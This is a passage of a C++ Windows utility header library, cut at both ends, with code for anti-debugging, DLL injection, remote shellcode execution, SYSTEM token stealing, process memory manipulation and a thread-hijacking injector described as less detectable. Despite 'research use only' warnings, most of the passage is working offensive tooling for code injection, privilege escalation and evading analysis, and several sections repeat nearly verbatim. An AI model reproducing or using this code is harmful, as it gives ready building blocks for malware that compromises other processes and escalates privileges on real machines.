        if(snap==INVALID_HANDLE_VALUE) return r;
        MODULEENTRY32W me{sizeof(MODULEENTRY32W)};
        if(Module32FirstW(snap,&me)) do { r.push_back(Str::ToNarrow(me.szExePath)); } while(Module32NextW(snap,&me));
        CloseHandle(snap); return r;
    }

} // namespace Memory

// ============================================================
//  SECTION P5 — Anti-Debug
// ============================================================
namespace AntiDebug {

    inline bool IsDebuggerPresent()  { return ::IsDebuggerPresent() != FALSE; }
    inline bool IsRemoteDebugger()   { BOOL p=FALSE; CheckRemoteDebuggerPresent(GetCurrentProcess(),&p); return p!=FALSE; }
    inline bool CheckHeapFlags() {
#ifdef _WIN64
        auto* peb=reinterpret_cast<BYTE*>(__readgsqword(0x60));
        return (*reinterpret_cast<DWORD*>(peb+0x70)&0x70)!=0||*reinterpret_cast<DWORD*>(peb+0x74)!=0;
#else
        auto* peb=reinterpret_cast<BYTE*>(__readfsdword(0x30));
        return (*reinterpret_cast<DWORD*>(peb+0x40)&0x70)!=0||*reinterpret_cast<DWORD*>(peb+0x44)!=0;
#endif
    }
    inline void HideFromDebugger() {
        typedef NTSTATUS(NTAPI* _PFN_NSIT1)(HANDLE,UINT,PVOID,ULONG);
        _PFN_NSIT1 f = reinterpret_cast<_PFN_NSIT1>(GetProcAddress(GetModuleHandleW(L"ntdll.dll"),"NtSetInformationThread"));
        if(f) f(GetCurrentThread(),17,nullptr,0);
    }
    inline void BlockDebuggerAttach() {
        typedef NTSTATUS(NTAPI* _PFN_NSIP1)(HANDLE,UINT,PVOID,ULONG);
        _PFN_NSIP1 f = reinterpret_cast<_PFN_NSIP1>(GetProcAddress(GetModuleHandleW(L"ntdll.dll"),"NtSetInformationProcess"));
        DWORD v=1; if(f) f(GetCurrentProcess(),31,&v,sizeof(v));
    }
    inline bool AnyDebuggerDetected() { return IsDebuggerPresent()||IsRemoteDebugger()||CheckHeapFlags(); }
    inline void TriggerIfDebugged(std::function<void()> onDbg, std::function<void()> otherwise=nullptr) {
        if(AnyDebuggerDetected()){if(onDbg)onDbg();}
        else{if(otherwise)otherwise();}
    }

} // namespace AntiDebug

// ============================================================
//  SECTION P6 — DLL Injection
// ============================================================
//  !! EXTREMELY DANGEROUS — RESEARCH/PERSONAL USE ONLY !!
//  Requires SeDebugPrivilege + Admin. Flagged by AV/EDR.
//  Only inject into processes you own or are authorized to modify.
// ============================================================
namespace Inject {

    inline bool InjectDLL(DWORD pid, const std::string& dllPath) {
        Ownership::_EnablePrivilege(SE_DEBUG_NAME);
        HANDLE hp=OpenProcess(PROCESS_ALL_ACCESS,FALSE,pid); if(!hp) return false;
        LPVOID mem=VirtualAllocEx(hp,nullptr,dllPath.size()+1,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
        if(!mem){CloseHandle(hp);return false;}
        WriteProcessMemory(hp,mem,dllPath.c_str(),dllPath.size()+1,nullptr);
        auto* ll=reinterpret_cast<LPTHREAD_START_ROUTINE>(
            GetProcAddress(GetModuleHandleW(L"kernel32.dll"),"LoadLibraryA"));
        HANDLE ht=CreateRemoteThread(hp,nullptr,0,ll,mem,0,nullptr);
        bool ok=ht!=nullptr;
        if(ht){WaitForSingleObject(ht,5000);CloseHandle(ht);}
        VirtualFreeEx(hp,mem,0,MEM_RELEASE); CloseHandle(hp); return ok;
    }

    inline bool EjectDLL(DWORD pid, const std::string& moduleName) {
        Ownership::_EnablePrivilege(SE_DEBUG_NAME);
        uintptr_t base=Memory::GetModuleBase(pid,moduleName); if(!base) return false;
        HANDLE hp=OpenProcess(PROCESS_ALL_ACCESS,FALSE,pid); if(!hp) return false;
        auto* fl=reinterpret_cast<LPTHREAD_START_ROUTINE>(
            GetProcAddress(GetModuleHandleW(L"kernel32.dll"),"FreeLibrary"));
        HANDLE ht=CreateRemoteThread(hp,nullptr,0,fl,reinterpret_cast<LPVOID>(base),0,nullptr);
        bool ok=ht!=nullptr;
        if(ht){WaitForSingleObject(ht,5000);CloseHandle(ht);}
        CloseHandle(hp); return ok;
    }

    /// Execute raw shellcode in a remote process. !! EXTREMELY DANGEROUS !!
    inline bool RemoteExecute(DWORD pid, const std::vector<BYTE>& shellcode) {
        Ownership::_EnablePrivilege(SE_DEBUG_NAME);
        HANDLE hp=OpenProcess(PROCESS_ALL_ACCESS,FALSE,pid); if(!hp) return false;
        LPVOID mem=VirtualAllocEx(hp,nullptr,shellcode.size(),MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);
        if(!mem){CloseHandle(hp);return false;}
        WriteProcessMemory(hp,mem,shellcode.data(),shellcode.size(),nullptr);
        HANDLE ht=CreateRemoteThread(hp,nullptr,0,
            reinterpret_cast<LPTHREAD_START_ROUTINE>(mem),nullptr,0,nullptr);
        bool ok=ht!=nullptr;
        if(ht){WaitForSingleObject(ht,10000);CloseHandle(ht);}
        VirtualFreeEx(hp,mem,0,MEM_RELEASE); CloseHandle(hp); return ok;
    }

} // namespace Inject

// ============================================================
//  SECTION P7 — Extended Process Control
// ============================================================
//  Suspend, resume, hollow, and manipulate processes.
//  Requires SeDebugPrivilege for processes you don't own.
// ============================================================
namespace ProcessCtrl {

    /// Suspend all threads of a process (freeze it)
    inline bool Suspend(DWORD pid) {
        Ownership::_EnablePrivilege(SE_DEBUG_NAME);
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if (snap == INVALID_HANDLE_VALUE) return false;
        THREADENTRY32 te{ sizeof(THREADENTRY32) };
        bool ok = false;
        if (Thread32First(snap, &te)) {
            do {
                if (te.th32OwnerProcessID != pid) continue;
                HANDLE ht = OpenThread(THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID);
                if (ht) { SuspendThread(ht); CloseHandle(ht); ok = true; }
            } while (Thread32Next(snap, &te));
        }
        CloseHandle(snap);
        return ok;
    }

    /// Resume all threads of a suspended process
    inline bool Resume(DWORD pid) {
        Ownership::_EnablePrivilege(SE_DEBUG_NAME);
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if (snap == INVALID_HANDLE_VALUE) return false;
        THREADENTRY32 te{ sizeof(THREADENTRY32) };
        bool ok = false;
        if (Thread32First(snap, &te)) {
            do {
                if (te.th32OwnerProcessID != pid) continue;
                HANDLE ht = OpenThread(THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID);
                if (ht) { ResumeThread(ht); CloseHandle(ht); ok = true; }
            } while (Thread32Next(snap, &te));
        }
        CloseHandle(snap);
        return ok;
    }

    /// Create a process in a suspended state.
    /// Returns process info — call ResumeThread(pi.hThread) to start it.
    inline std::optional<PROCESS_INFORMATION> CreateSuspended(
            const std::string& exe, const std::string& args = "") {
        STARTUPINFOW si{}; si.cb = sizeof(si);
        PROCESS_INFORMATION pi{};
        std::wstring cmd = Str::ToWide(exe);
        if (!args.empty()) cmd += L" " + Str::ToWide(args);
        if (!CreateProcessW(nullptr, cmd.data(), nullptr, nullptr,
            FALSE, CREATE_SUSPENDED, nullptr, nullptr, &si, &pi))
            return std::nullopt;
        return pi;
    }

    /// Get the entry point address of a remote process's main module
    inline uintptr_t GetEntryPoint(DWORD pid) {
        Ownership::_EnablePrivilege(SE_DEBUG_NAME);
        HANDLE hp = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
        if (!hp) return 0;
        // Get PEB address via NtQueryInformationProcess
        using NtQIP_t = NTSTATUS(NTAPI*)(HANDLE, UINT, PVOID, ULONG, PULONG);
        auto NtQIP = reinterpret_cast<NtQIP_t>(
            GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQueryInformationProcess"));
        if (!NtQIP) { CloseHandle(hp); return 0; }
        PROCESS_BASIC_INFORMATION pbi{};
        NtQIP(hp, 0, &pbi, sizeof(pbi), nullptr);
        // Read PEB -> ImageBaseAddress
        uintptr_t pebAddr = reinterpret_cast<uintptr_t>(pbi.PebBaseAddress);
        uintptr_t imageBase = 0;
        ReadProcessMemory(hp, reinterpret_cast<LPCVOID>(pebAddr + 0x10),
            &imageBase, sizeof(imageBase), nullptr);
        // Read PE header -> AddressOfEntryPoint
        BYTE dosHeader[0x40] = {};
        ReadProcessMemory(hp, reinterpret_cast<LPCVOID>(imageBase),
            dosHeader, sizeof(dosHeader), nullptr);
        DWORD peOffset = *reinterpret_cast<DWORD*>(dosHeader + 0x3C);
        DWORD entryRva = 0;
        // Optional header starts at peOffset + 0x18
        // AddressOfEntryPoint is at offset 0x10 within the optional header
        ReadProcessMemory(hp,
            reinterpret_cast<LPCVOID>(imageBase + peOffset + 0x18 + 0x10),
            &entryRva, sizeof(entryRva), nullptr);
        CloseHandle(hp);
        return imageBase + entryRva;
    }

    /// Wait for a process to finish, then get its exit code
    inline DWORD WaitAndGetExitCode(DWORD pid, DWORD timeoutMs = INFINITE) {
        HANDLE hp = OpenProcess(PROCESS_SYNCHRONIZE | PROCESS_QUERY_INFORMATION,
            FALSE, pid);
        if (!hp) return 0xFFFFFFFF;
        WaitForSingleObject(hp, timeoutMs);
        DWORD code = 0;
        GetExitCodeProcess(hp, &code);
        CloseHandle(hp);
        return code;
    }

    /// Set the priority of a process
    /// priority: IDLE_PRIORITY_CLASS, BELOW_NORMAL_PRIORITY_CLASS,
    ///           NORMAL_PRIORITY_CLASS, ABOVE_NORMAL_PRIORITY_CLASS,
    ///           HIGH_PRIORITY_CLASS, REALTIME_PRIORITY_CLASS
    inline bool SetPriority(DWORD pid, DWORD priorityClass) {
        HANDLE hp = OpenProcess(PROCESS_SET_INFORMATION, FALSE, pid);
        if (!hp) return false;
        bool ok = SetPriorityClass(hp, priorityClass) != FALSE;
        CloseHandle(hp);
        return ok;
    }

    /// Set CPU affinity mask for a process
    inline bool SetAffinity(DWORD pid, DWORD_PTR affinityMask) {
        HANDLE hp = OpenProcess(PROCESS_SET_INFORMATION, FALSE, pid);
        if (!hp) return false;
        bool ok = SetProcessAffinityMask(hp, affinityMask) != FALSE;
        CloseHandle(hp);
        return ok;
    }

} // namespace ProcessCtrl

// ============================================================
//  SECTION P8 — Token Manipulation
// ============================================================
//  Token impersonation, elevation, and identity switching.
//  Requires SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege.
//  !! Stealing tokens from SYSTEM processes is extremely powerful !!
// ============================================================
namespace Token {

    /// Duplicate a token from another process (token stealing)
    /// Returns the duplicated token handle, or nullptr on failure.
    /// Common use: steal SYSTEM token from winlogon.exe for full access
    inline HANDLE StealFromProcess(DWORD pid) {
        Ownership::_EnablePrivilege(SE_DEBUG_NAME);
        Ownership::_EnablePrivilege(SE_IMPERSONATE_NAME);
        HANDLE hp = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
        if (!hp) return nullptr;
        HANDLE hToken = nullptr, hDup = nullptr;
        OpenProcessToken(hp, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken);
        CloseHandle(hp);
        if (!hToken) return nullptr;
        DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, nullptr,
            SecurityImpersonation, TokenPrimary, &hDup);
        CloseHandle(hToken);
        return hDup;
    }

    /// Steal token from the first process matching a name
    /// e.g. Token::StealFromProcessName("winlogon.exe") for SYSTEM
    inline HANDLE StealFromProcessName(const std::string& processName) {
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap == INVALID_HANDLE_VALUE) return nullptr;
        PROCESSENTRY32W pe{ sizeof(PROCESSENTRY32W) };
        std::string lower = processName;
        std::transform(lower.begin(), lower.end(), lower.begin(), ::tolower);
        DWORD targetPid = 0;
        if (Process32FirstW(snap, &pe)) {
            do {
                std::string name = Str::ToNarrow(pe.szExeFile);
                std::transform(name.begin(), name.end(), name.begin(), ::tolower);
                if (name == lower) { targetPid = pe.th32ProcessID; break; }
            } while (Process32NextW(snap, &pe));
        }
        CloseHandle(snap);
        if (!targetPid) return nullptr;
        return StealFromProcess(targetPid);
    }

    /// Impersonate a token (run current thread as that token's user)
    inline bool Impersonate(HANDLE hToken) {
        Ownership::_EnablePrivilege(SE_IMPERSONATE_NAME);
        return ImpersonateLoggedOnUser(hToken) != FALSE;
    }

    /// Stop impersonating and revert to the process token
    inline void RevertImpersonation() {
        RevertToSelf();
    }

    /// Launch a process under a stolen token
    inline bool CreateProcessWithToken(HANDLE hToken,
                                        const std::string& exe,
                                        const std::string& args = "") {
        Ownership::_EnablePrivilege(SE_ASSIGNPRIMARYTOKEN_NAME);
        Ownership::_EnablePrivilege(SE_INCREASE_QUOTA_NAME);
        STARTUPINFOW si{}; si.cb = sizeof(si);
        PROCESS_INFORMATION pi{};
        std::wstring cmd = Str::ToWide(exe);
        if (!args.empty()) cmd += L" " + Str::ToWide(args);
        bool ok = CreateProcessWithTokenW(hToken, LOGON_WITH_PROFILE,
            nullptr, cmd.data(), 0, nullptr, nullptr, &si, &pi) != FALSE;
        if (ok) { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
        return ok;
    }

    /// Get the username associated with a token
    inline std::string GetTokenUsername(HANDLE hToken) {
        DWORD sz = 0;
        GetTokenInformation(hToken, TokenUser, nullptr, 0, &sz);
        std::vector<BYTE> buf(sz);
        if (!GetTokenInformation(hToken, TokenUser, buf.data(), sz, &sz))
            return {};
        PSID pSid = reinterpret_cast<TOKEN_USER*>(buf.data())->User.Sid;
        wchar_t name[256] = {}, domain[256] = {};
        DWORD ns = 256, ds = 256; SID_NAME_USE use;
        LookupAccountSidW(nullptr, pSid, name, &ns, domain, &ds, &use);
        return Str::ToNarrow(domain) + "\\" + Str::ToNarrow(name);
    }

    /// Check if a token has SYSTEM level privileges
    inline bool IsSystemToken(HANDLE hToken) {
        DWORD sz = 0;
        GetTokenInformation(hToken, TokenUser, nullptr, 0, &sz);
        std::vector<BYTE> buf(sz);
        GetTokenInformation(hToken, TokenUser, buf.data(), sz, &sz);
        PSID pSid = reinterpret_cast<TOKEN_USER*>(buf.data())->User.Sid;
        PSID systemSid = nullptr;
        SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
        AllocateAndInitializeSid(&ntAuth, 1, SECURITY_LOCAL_SYSTEM_RID,
            0,0,0,0,0,0,0, &systemSid);
        bool isSystem = EqualSid(pSid, systemSid) != FALSE;
        FreeSid(systemSid);
        return isSystem;
    }

} // namespace Token

// ============================================================
//  SECTION P9 — Extended Anti-Debug
// ============================================================
//  Additional detection techniques beyond the basics.
// ============================================================
namespace AntiDebug {

    inline bool IsDebuggerPresent()  { return ::IsDebuggerPresent() != FALSE; }
    inline bool IsRemoteDebugger()   { BOOL p=FALSE; CheckRemoteDebuggerPresent(GetCurrentProcess(),&p); return p!=FALSE; }

    inline bool CheckHeapFlags() {
#ifdef _WIN64
        auto* peb=reinterpret_cast<BYTE*>(__readgsqword(0x60));
        return (*reinterpret_cast<DWORD*>(peb+0x70)&0x70)!=0||*reinterpret_cast<DWORD*>(peb+0x74)!=0;
#else
        auto* peb=reinterpret_cast<BYTE*>(__readfsdword(0x30));
        return (*reinterpret_cast<DWORD*>(peb+0x40)&0x70)!=0||*reinterpret_cast<DWORD*>(peb+0x44)!=0;
#endif
    }

    /// Check for hardware breakpoints in the current thread's debug registers
    inline bool CheckHardwareBreakpoints() {
        CONTEXT ctx{}; ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
        if (!GetThreadContext(GetCurrentThread(), &ctx)) return false;
        return ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3;
    }

    /// Check NtGlobalFlag in PEB — set by debuggers
    inline bool CheckNtGlobalFlag() {
#ifdef _WIN64
        auto* peb = reinterpret_cast<BYTE*>(__readgsqword(0x60));
        DWORD flags = *reinterpret_cast<DWORD*>(peb + 0xBC);
#else
        auto* peb = reinterpret_cast<BYTE*>(__readfsdword(0x30));
        DWORD flags = *reinterpret_cast<DWORD*>(peb + 0x68);
#endif
        // FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS
        return (flags & 0x70) != 0;
    }

    /// Check if a parent process is an unexpected debugger
    /// (e.g. parent should be explorer.exe, not x64dbg.exe)
    inline bool CheckParentProcess(const std::string& expectedParent = "explorer.exe") {
        using NtQIP_t = NTSTATUS(NTAPI*)(HANDLE, UINT, PVOID, ULONG, PULONG);
        auto NtQIP = reinterpret_cast<NtQIP_t>(
            GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQueryInformationProcess"));
        if (!NtQIP) return false;
        PROCESS_BASIC_INFORMATION pbi{};
        NtQIP(GetCurrentProcess(), 0, &pbi, sizeof(pbi), nullptr);
        // InheritedFromUniqueProcessId is the 6th ULONG_PTR field in PBI
        // Read it by casting to raw pointer at the correct offset
        DWORD parentPid = static_cast<DWORD>(
            *reinterpret_cast<ULONG_PTR*>(
                reinterpret_cast<BYTE*>(&pbi) + 5 * sizeof(ULONG_PTR)));
        // Get parent process name
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap == INVALID_HANDLE_VALUE) return false;
        PROCESSENTRY32W pe{ sizeof(PROCESSENTRY32W) };
        std::string parentName;
        if (Process32FirstW(snap, &pe)) {
            do {
                if (pe.th32ProcessID == parentPid) {
                    parentName = Str::ToNarrow(pe.szExeFile);
                    std::transform(parentName.begin(), parentName.end(),
                        parentName.begin(), ::tolower);
                    break;
                }
            } while (Process32NextW(snap, &pe));
        }
        CloseHandle(snap);
        std::string exp = expectedParent;
        std::transform(exp.begin(), exp.end(), exp.begin(), ::tolower);
        return !parentName.empty() && parentName != exp;
    }

    /// Exception-based debugger detection using OutputDebugString timing trick
    /// (avoids __try/__except which requires /EHa compiler flag)
    inline bool CheckExceptionHandler() {
        // If a debugger is attached, OutputDebugStringW triggers a handled exception
        // that causes a measurable timing difference
        DWORD start = GetTickCount();
        OutputDebugStringW(L"WinUtils::AntiDebug::CheckExceptionHandler");
        DWORD elapsed = GetTickCount() - start;
        // Under a debugger this takes noticeably longer (>1ms vs ~0ms)
        return elapsed > 2;
    }

    inline void HideFromDebugger() {
        typedef NTSTATUS(NTAPI* _PFN_NSIT1)(HANDLE,UINT,PVOID,ULONG);
        _PFN_NSIT1 f = reinterpret_cast<_PFN_NSIT1>(GetProcAddress(GetModuleHandleW(L"ntdll.dll"),"NtSetInformationThread"));
        if(f) f(GetCurrentThread(),17,nullptr,0);
    }

    inline void BlockDebuggerAttach() {
        typedef NTSTATUS(NTAPI* _PFN_NSIP1)(HANDLE,UINT,PVOID,ULONG);
        _PFN_NSIP1 f = reinterpret_cast<_PFN_NSIP1>(GetProcAddress(GetModuleHandleW(L"ntdll.dll"),"NtSetInformationProcess"));
        DWORD v=1; if(f) f(GetCurrentProcess(),31,&v,sizeof(v));
    }

    /// Run all detection checks
    inline bool AnyDebuggerDetected() {
        return IsDebuggerPresent()    ||
               IsRemoteDebugger()     ||
               CheckHeapFlags()       ||
               CheckNtGlobalFlag()    ||
               CheckHardwareBreakpoints();
    }

    inline void TriggerIfDebugged(std::function<void()> onDbg,
                                   std::function<void()> otherwise = nullptr) {
        if (AnyDebuggerDetected()) { if (onDbg) onDbg(); }
        else                       { if (otherwise) otherwise(); }
    }

} // namespace AntiDebug

// ============================================================
//  SECTION P10 — Extended Memory Utilities
// ============================================================
namespace Memory {

    inline bool Read(DWORD pid, uintptr_t addr, void* buf, size_t sz) {
        HANDLE h=OpenProcess(PROCESS_VM_READ,FALSE,pid); if(!h) return false;
        SIZE_T n=0; bool ok=ReadProcessMemory(h,reinterpret_cast<LPCVOID>(addr),buf,sz,&n)&&n==sz;
        CloseHandle(h); return ok;
    }
    inline bool Write(DWORD pid, uintptr_t addr, const void* buf, size_t sz) {
        HANDLE h=OpenProcess(PROCESS_VM_WRITE|PROCESS_VM_OPERATION,FALSE,pid); if(!h) return false;
        SIZE_T n=0; bool ok=WriteProcessMemory(h,reinterpret_cast<LPVOID>(addr),buf,sz,&n)&&n==sz;
        CloseHandle(h); return ok;
    }
    template<typename T> inline std::optional<T> ReadT(DWORD pid, uintptr_t addr) {
        T v{}; if(!Read(pid,addr,&v,sizeof(T))) return std::nullopt; return v;
    }
    template<typename T> inline bool WriteT(DWORD pid, uintptr_t addr, const T& val) {
        return Write(pid,addr,&val,sizeof(T));
    }

    /// Read a null-terminated ASCII string from a remote process
    inline std::string ReadString(DWORD pid, uintptr_t addr, size_t maxLen = 256) {
        std::vector<char> buf(maxLen, 0);
        Read(pid, addr, buf.data(), maxLen);
        return std::string(buf.data());
    }

    /// Read a null-terminated wide string from a remote process
    inline std::wstring ReadWString(DWORD pid, uintptr_t addr, size_t maxChars = 256) {
        std::vector<wchar_t> buf(maxChars, 0);
        Read(pid, addr, buf.data(), maxChars * sizeof(wchar_t));
        return std::wstring(buf.data());
    }

    /// Write a string to a remote process (including null terminator)
    inline bool WriteString(DWORD pid, uintptr_t addr, const std::string& str) {
        return Write(pid, addr, str.c_str(), str.size() + 1);
    }

    inline uintptr_t Alloc(DWORD pid, size_t sz, DWORD protect=PAGE_EXECUTE_READWRITE) {
        HANDLE h=OpenProcess(PROCESS_VM_OPERATION,FALSE,pid); if(!h) return 0;
        auto* p=VirtualAllocEx(h,nullptr,sz,MEM_COMMIT|MEM_RESERVE,protect);
        CloseHandle(h); return reinterpret_cast<uintptr_t>(p);
    }
    inline bool Free(DWORD pid, uintptr_t addr) {
        HANDLE h=OpenProcess(PROCESS_VM_OPERATION,FALSE,pid); if(!h) return false;
        bool ok=VirtualFreeEx(h,reinterpret_cast<LPVOID>(addr),0,MEM_RELEASE)!=FALSE;
        CloseHandle(h); return ok;
    }
    inline bool Protect(DWORD pid, uintptr_t addr, size_t sz, DWORD prot, DWORD* old=nullptr) {
        HANDLE h=OpenProcess(PROCESS_VM_OPERATION,FALSE,pid); if(!h) return false;
        DWORD o=0; bool ok=VirtualProtectEx(h,reinterpret_cast<LPVOID>(addr),sz,prot,&o)!=FALSE;
        if(old)*old=o; CloseHandle(h); return ok;
    }

    /// Enumerate all committed memory regions in a remote process
    struct MemoryRegion {
        uintptr_t base     = 0;
        size_t    size     = 0;
        DWORD     protect  = 0;
        DWORD     state    = 0;
        DWORD     type     = 0;
    };

    inline std::vector<MemoryRegion> EnumerateRegions(DWORD pid) {
        std::vector<MemoryRegion> result;
        HANDLE hp = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
            FALSE, pid);
        if (!hp) return result;
        MEMORY_BASIC_INFORMATION mbi{};
        uintptr_t addr = 0;
        while (VirtualQueryEx(hp, reinterpret_cast<LPCVOID>(addr),
            &mbi, sizeof(mbi)) == sizeof(mbi)) {
            if (mbi.State == MEM_COMMIT) {
                MemoryRegion r;
                r.base    = reinterpret_cast<uintptr_t>(mbi.BaseAddress);
                r.size    = mbi.RegionSize;
                r.protect = mbi.Protect;
                r.state   = mbi.State;
                r.type    = mbi.Type;
                result.push_back(r);
            }
            addr = reinterpret_cast<uintptr_t>(mbi.BaseAddress) + mbi.RegionSize;
            if (addr == 0) break; // wrapped around
        }
        CloseHandle(hp);
        return result;
    }

    inline uintptr_t FindPattern(DWORD pid, uintptr_t start, size_t regionSz,
                                  const std::vector<BYTE>& pat,
                                  const std::vector<BYTE>& mask) {
        std::vector<BYTE> buf(regionSz);
        if(!Read(pid,start,buf.data(),regionSz)) return 0;
        for(size_t i=0;i+pat.size()<=regionSz;++i) {
            bool ok=true;
            for(size_t j=0;j<pat.size();++j) if(mask[j]&&buf[i+j]!=pat[j]){ok=false;break;}
            if(ok) return start+i;
        }
        return 0;
    }

    /// Scan all committed regions of a process for a pattern
    inline uintptr_t FindPatternAll(DWORD pid,
                                     const std::vector<BYTE>& pat,
                                     const std::vector<BYTE>& mask) {
        for (auto& region : EnumerateRegions(pid)) {
            if (!(region.protect & PAGE_EXECUTE_READ) &&
                !(region.protect & PAGE_EXECUTE_READWRITE) &&
                !(region.protect & PAGE_READWRITE) &&
                !(region.protect & PAGE_READONLY)) continue;
            uintptr_t found = FindPattern(pid, region.base, region.size, pat, mask);
            if (found) return found;
        }
        return 0;
    }

    inline bool DumpRegion(DWORD pid, uintptr_t addr, size_t sz,
                            const std::string& path) {
        std::vector<BYTE> buf(sz);
        if(!Read(pid,addr,buf.data(),sz)) return false;
        std::ofstream f(path,std::ios::binary); if(!f) return false;
        f.write(reinterpret_cast<char*>(buf.data()),buf.size()); return f.good();
    }

    inline uintptr_t GetModuleBase(DWORD pid, const std::string& modName) {
        HANDLE snap=CreateToolhelp32Snapshot(TH32CS_SNAPMODULE|TH32CS_SNAPMODULE32,pid);
        if(snap==INVALID_HANDLE_VALUE) return 0;
        MODULEENTRY32W me{sizeof(MODULEENTRY32W)};
        std::string low=modName;
        std::transform(low.begin(),low.end(),low.begin(),::tolower);
        uintptr_t base=0;
        if(Module32FirstW(snap,&me)) do {
            std::string mn=Str::ToNarrow(me.szModule);
            std::transform(mn.begin(),mn.end(),mn.begin(),::tolower);
            if(mn==low){base=reinterpret_cast<uintptr_t>(me.modBaseAddr);break;}
        } while(Module32NextW(snap,&me));
        CloseHandle(snap); return base;
    }

    inline std::vector<std::string> ListModules(DWORD pid) {
        std::vector<std::string> r;
        HANDLE snap=CreateToolhelp32Snapshot(TH32CS_SNAPMODULE|TH32CS_SNAPMODULE32,pid);
        if(snap==INVALID_HANDLE_VALUE) return r;
        MODULEENTRY32W me{sizeof(MODULEENTRY32W)};
        if(Module32FirstW(snap,&me)) do {
            r.push_back(Str::ToNarrow(me.szExePath));
        } while(Module32NextW(snap,&me));
        CloseHandle(snap); return r;
    }

} // namespace Memory

// ============================================================
//  SECTION P11 — Extended Injection Techniques
// ============================================================
//  !! EXTREMELY DANGEROUS — RESEARCH/PERSONAL USE ONLY !!
// ============================================================
namespace Inject {

    /// Classic LoadLibrary injection
    inline bool InjectDLL(DWORD pid, const std::string& dllPath) {
        Ownership::_EnablePrivilege(SE_DEBUG_NAME);
        HANDLE hp=OpenProcess(PROCESS_ALL_ACCESS,FALSE,pid); if(!hp) return false;
        LPVOID mem=VirtualAllocEx(hp,nullptr,dllPath.size()+1,
            MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
        if(!mem){CloseHandle(hp);return false;}
        WriteProcessMemory(hp,mem,dllPath.c_str(),dllPath.size()+1,nullptr);
        auto* ll=reinterpret_cast<LPTHREAD_START_ROUTINE>(
            GetProcAddress(GetModuleHandleW(L"kernel32.dll"),"LoadLibraryA"));
        HANDLE ht=CreateRemoteThread(hp,nullptr,0,ll,mem,0,nullptr);
        bool ok=ht!=nullptr;
        if(ht){WaitForSingleObject(ht,5000);CloseHandle(ht);}
        VirtualFreeEx(hp,mem,0,MEM_RELEASE); CloseHandle(hp); return ok;
    }

    /// Eject a DLL from a remote process
    inline bool EjectDLL(DWORD pid, const std::string& moduleName) {
        Ownership::_EnablePrivilege(SE_DEBUG_NAME);
        uintptr_t base=Memory::GetModuleBase(pid,moduleName); if(!base) return false;
        HANDLE hp=OpenProcess(PROCESS_ALL_ACCESS,FALSE,pid); if(!hp) return false;
        auto* fl=reinterpret_cast<LPTHREAD_START_ROUTINE>(
            GetProcAddress(GetModuleHandleW(L"kernel32.dll"),"FreeLibrary"));
        HANDLE ht=CreateRemoteThread(hp,nullptr,0,
            fl,reinterpret_cast<LPVOID>(base),0,nullptr);
        bool ok=ht!=nullptr;
        if(ht){WaitForSingleObject(ht,5000);CloseHandle(ht);}
        CloseHandle(hp); return ok;
    }

    /// Thread hijacking injection — hijack an existing thread instead of
    /// creating a new one (less detectable than CreateRemoteThread)
    inline bool HijackThread(DWORD pid, const std::string& dllPath) {
        Ownership::_EnablePrivilege(SE_DEBUG_NAME);
        // Find the first thread of the target process
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if (snap == INVALID_HANDLE_VALUE) return false;
        THREADENTRY32 te{ sizeof(THREADENTRY32) };
        DWORD targetTid = 0;
        if (Thread32First(snap, &te)) {
            do {
                if (te.th32OwnerProcessID == pid) { targetTid = te.th32ThreadID; break; }
            } while (Thread32Next(snap, &te));
        }
        CloseHandle(snap);
        if (!targetTid) return false;

        HANDLE hp = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, pid);
        HANDLE ht = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT |
            THREAD_SUSPEND_RESUME, FALSE, targetTid);
        if (!hp || !ht) {
            if (hp) CloseHandle(hp);
            if (ht) CloseHandle(ht);
            return false;
        }

        SuspendThread(ht);

        // Get thread context
        CONTEXT ctx{}; ctx.ContextFlags = CONTEXT_FULL;
        GetThreadContext(ht, &ctx);

        // Allocate shellcode region
        size_t pathLen = dllPath.size() + 1;
        LPVOID pathMem = VirtualAllocEx(hp, nullptr, pathLen,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        WriteProcessMemory(hp, pathMem, dllPath.c_str(), pathLen, nullptr);

        // Build a small stub that calls LoadLibraryA then restores original RIP
        // For simplicity, just overwrite RIP to LoadLibraryA with path arg
        // (production code would build a proper trampoline)
        LPTHREAD_START_ROUTINE ll = reinterpret_cast<LPTHREAD_START_ROUTINE>(
            GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryA"));

#ifdef _WIN64
        uintptr_t origRip = ctx.Rip;
        ctx.Rcx = reinterpret_cast<uintptr_t>(pathMem); // arg1
        // assign the RIP as an integer address of the function
        ctx.Rip = reinterpret_cast<uintptr_t>(ll);
#else
        // assign the EIP as an integer address of the function
        ctx.Eip = reinterpret_cast<DWORD>(ll);
        // Push path address onto stack
        ctx.Esp -= sizeof(DWORD);
        DWORD pathAddr = reinterpret_cast<DWORD>(pathMem);
